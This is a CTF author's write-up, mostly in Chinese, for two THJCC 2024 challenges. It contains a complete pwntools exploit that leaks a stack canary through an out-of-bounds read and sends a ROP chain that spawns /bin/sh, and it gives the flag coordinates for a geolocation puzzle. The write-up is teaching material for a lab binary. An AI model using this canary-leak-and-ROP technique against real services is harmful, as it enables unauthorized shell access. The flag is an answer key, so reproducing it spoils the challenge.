---
title: "THJCC 2024 Winter Writeup"
description: "THJCC 2024 Winter Writeup (Question designer)"
publishDate: "15 Dec 2024"
updatedDate: "25 Aug 2025"
tags: ["CTF", "writeup", "pwn", "misc"]
---

# CTF 比賽出題初體驗

這次擔任 `THJCC 第二屆` 的出題者  
算是我第一次正式出題的體驗
題目有不好的地方就請見諒

~~比賽前一天發現自己把題解刪掉了，害我連夜重寫一份 exploit~~

# pwn-TheBestAnime

## 題序

---
那似乎是ROP，  
這種攻擊天生單翼，  
需要Gadgets相互扶持依偎，  
否則無法翱翔天際，  
是種有缺陷的生物。  
但是，不知為何，  
我卻認為，  
這種生存方式是美好的。

---
"The ROP, also known as “the payload that shares wings,” only possesses one wing. Unless gadgets lean on each other and act as one, they’re incapable of flight. They’re imperfect, incomplete creatures. But, for some reason, their way of life, struck me as profoundly beautiful. It was beautiful, I felt."

`Author: Grissia`

---

## 檔案

- chal

## 想法

這題大概的解法就是在 `darling` 函式中有 `OOB` 可以 leak canary  
leak canary 之後可以在 `main` 最後 `gets` 構建 rop chain  

### Step 1

用 ida 直接反組譯後可以看到第一步就是要輸入 `Darling in the FRANXX`  

### Step 2

跳轉到 `darling` 函式後有一個很明顯的 `OOB`  
可以分別輸入 `14` `15` 來得到兩段 canary  

### Step 3

用剛剛得到的 canary 值就可以放心 overflow  
構建 rop chain 後就大功告成

## Exploit

```python
from pwn import *
import sys

context.log_level = "debug"
context.terminal = ["wt.exe", "wsl.exe"]
context.arch = "amd64"

exe = context.binary = ELF("./chal")

if len(sys.argv) == 1:
    r = process("./chal")
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)


r.sendlineafter(b'> ', b'Darling in the FRANXX')

r.sendlineafter(b'> ', b'15')
upper = r.recvline().decode().split()[1]
r.sendlineafter(b'> ', b'14')
lower = r.recvline().decode().split()[1]

canary = int(upper+lower, 16)
success(f"canary: {hex(canary)}")

"""
rax = 0x3b
rdi = /bin/sh\x00
rsi = 0
rdx = 0

0x0000000000434bbb : pop rax ; ret
0x0000000000433f95 : mov qword ptr [rsi], rax ; ret
0x000000000041fcf5 : pop rsi ; ret
0x00000000004571e7 : pop rbx ; ret
0x0000000000494253 : pop rdi ; ret
0x0000000000432f5b : mov rdx, rbx ; syscall
"""
pop_rax = 0x434bbb
mov_rsi_rax = 0x433f95
pop_rsi = 0x41fcf5
pop_rbx = 0x4571e7
mov_rdx_rbx = 0x432f5b
pop_rdi = 0x494253

rop = b''
rop += b'a'*56
rop += p64(canary)
rop += p64(0)
rop += p64(pop_rax)
rop += b'/bin/sh\x00'
rop += p64(pop_rsi)
rop += p64(0x4cccc0)  # somewhere writable
rop += p64(mov_rsi_rax)  # set /bin/sh
rop += p64(pop_rbx)
rop += p64(0)
rop += p64(pop_rax)  # set rax
rop += p64(0x3b)
rop += p64(pop_rdi)  # set rdi
rop += p64(0x4cccc0)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(mov_rdx_rbx)  # set rdx

r.sendlineafter(b'> ', rop)

r.interactive()
```

[TheBestAnime](https://github.com/Grissia/TheBestAnime)

# misc-Happy College Life

## 題序

Where is this place ???

把拍照位置的經緯度座標放到 `THJCC{}` 裡面，並且單位保留到分，像是 `24°59'57.8"N 121°19'34.4"E` 要被表示成 `THJCC{2459N,12119E}`

---
Put the found latitude and longitude into the format `THJCC{}` and keep the precision up to the minutes. For example, `24°59'57.8"N 121°19'34.4"E` should be submitted as `THJCC{2459N,12119E}`.
![secret_place](https://hackmd.io/_uploads/SJXKtiKVJe.jpg)

> Author: Grissia

## 檔案

- secret_place.jpg

---

## 想法

最明顯的是樹後面有一個超大的藍色金字塔  
放大圖片還可以看到垃圾桶上 Long Beach 的 logo  
而且題目名稱就是 `Happy College Life`  
可以推測這是某個大學裡的地點  

btw，這張照片是我去 `CSULB` 的時候在宿舍門口拍的  

## Flag

`THJCC{3346N,11807W}`